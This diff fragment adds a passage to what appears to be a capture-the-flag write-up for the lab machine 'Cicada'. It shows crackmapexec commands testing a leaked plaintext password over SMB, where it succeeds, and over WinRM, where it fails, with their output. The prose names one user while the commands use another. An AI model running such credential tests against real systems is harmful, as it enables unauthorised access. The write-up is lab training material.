@@ -391,4 +391,27 @@ Interestingly, we find a plaintext password embedded in the user comment field: 
 
 <br />
 
+As michael.wrightson credentials, they work for SMB:
 
+<br />
+
+```bash
+❯ cme smb cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows 10.0 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3
+```
+
+<br />
+
+But don't work for WINRM:
+
+<br />
+
+```bash
+❯ cme winrm cicada.htb -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3'
+SMB         10.10.11.35     5985   CICADA-DC        [*] Windows 10.0 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
+HTTP        10.10.11.35     5985   CICADA-DC        [*] http://10.10.11.35:5985/wsman
+HTTP        10.10.11.35     5985   CICADA-DC        [-] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
+```
+
+<br />
